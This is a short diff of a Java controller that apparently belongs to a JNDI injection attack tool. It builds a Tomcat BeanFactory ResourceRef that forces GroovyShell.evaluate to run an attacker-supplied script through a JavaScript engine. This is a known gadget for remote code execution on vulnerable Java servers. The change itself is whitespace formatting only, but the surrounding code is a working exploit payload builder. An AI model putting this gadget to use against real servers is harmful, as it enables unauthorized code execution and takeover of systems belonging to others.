@@ -22,9 +22,9 @@ public class GroovyShellController extends BasicController {
 
         String script = "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\");";
 
-        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=evaluate"));
-        ref.add(new StringRefAddr("x",script));
+        ref.add(new StringRefAddr("x", script));
         return ref;
     }
 }
